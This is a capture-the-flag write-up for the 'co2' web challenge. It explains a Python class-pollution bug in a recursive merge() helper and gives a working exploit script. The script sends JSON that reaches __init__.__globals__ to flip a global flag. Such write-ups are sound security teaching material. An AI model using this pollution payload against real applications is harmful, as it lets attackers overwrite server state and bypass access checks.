# co2

## Description
```
A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.

Author: n00b.master.
```

## Provided Files
```
- co2.zip
```

## Writeup

> [!NOTE]
> Credits to [Jones](https://github.com/jonasheschl) who worked together with me on this challenge.

Starting off, we inspected our entrypoint. <br/>
```py
flag = os.getenv("flag")

@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

To retrieve the flag we would have to change the variable `flag` to `"true"`. <br/>
It was clear to us that we would need to access the `global-context` to change the value of this variable because changing the `env-var` somehow would prove useless if we couldn't crash the server to restart the service and load the `env-vars` once again. <br/>
Knowing this we inspected the `self-made` utility functions. <br/>
```py
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def save_feedback_to_disk(feedback_obj):
    feedback = ""
    for attr in dir(feedback_obj):
        if not attr.startswith('__') and not callable(getattr(feedback_obj, attr)):
            feedback += f"{attr}: {getattr(feedback_obj, attr)}\n"
    feedback_dir = 'feedback'
    if not os.path.exists(feedback_dir):
        os.makedirs(feedback_dir)
        print(f"Directory {feedback_dir} created.")
    else:
        print(f"Directory {feedback_dir} already exists.")
    files = glob.glob(os.path.join(feedback_dir, '*'))
    if len(files) >= 5:
        oldest_file = min(files, key=os.path.getctime)
        os.remove(oldest_file)
        print(f"Deleted oldest file: {oldest_file}")
    new_file_name = os.path.join(feedback_dir, f"feedback_{int(time.time())}.txt")
    with open(new_file_name, 'w') as file:
        file.write(feedback)
    print(f"Saved feedback to {new_file_name}")
    return True 
```

The issue we saw was hidden inside the `merge()` function. <br/>
The merge function tries to merge a `json-object` with a `python-class` to dynamically add properties. <br/>
The issue is that you can overwrite the `builtin` class funtions. <br/>
```py
# Builtin-functions of the feedback-class
['title', 'content', 'rating', 'referred', '__module__', '__init__', '__dict__', '__weakref__', '__doc__', '__new__', '__repr__', '__hash__', '__str__', '__getattribute__', '__setattr__', '__delattr__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__reduce_ex__', '__reduce__', '__getstate__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
```

Using this we thought about accessing the `global-context` of the app through the `class-tree`. <br/>
After finding `globals()['flag']` which displayed the variable value we tried to replicate this within a class object. <br/>
PoC: <br/>
```py
flag = "false"

class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""

feedback.__init__.__globals__["flag"] = "true"
```

Local-Testing Script: <br/>
```py
import json

flag = "false"

class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            print(1)
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

feedback = Feedback()

data = json.loads('''{
    "title": "123",
    "content": "123", 
    "rating": "5",
    "referred": "No",
    "__init__": {"__globals__['flag']": "true"}
}''')

merge(data, feedback)

print(flag)
```

Testing it out we found that we needed to use a nested version of our exploit. <br/>
Final exploit: <br/>
```py
import requests

base_URL = 'https://web-co2-2041887b420a1da8.2024.ductf.dev/'

cookies = {
    'session': '.eJwlzjEOwyAMBdC7MHfAGIPJZSKwv5WuSTNVvXsr9Z3gvdMeJ64jba_zxiPtT09bElAzU-0ZMXKfSiYShJar5h4KFVef7KSSNTp71Ghoi9ZyhsmgNsqYXGNmdh8FGiGazUp11xHd1uxqBjY1MZrFYTDuwwFOv8h94fxvKH2-CDUxGg.ZorDTg.WAigA_JNW377oQmTHdHgjRM1pSw'
}

payload = {
    "title":"123",
    "content":"123",
    "rating":"1",
    "referred":"123", 
    "__init__": {
        "__globals__": {
            "flag": "true"
        }
    }
}

res = requests.post(f'{base_URL}save_feedback', json=payload, cookies=cookies)


if res.status_code == 200:

    res = requests.get(f'{base_URL}get_flag', cookies=cookies)

    print(res.text)
```

Running the exploit reveals the flag which concludes this writeup. <br/>
```sh
$ python3 test.py
DUCTF{_cl455_p0lluti0n_ftw_}
```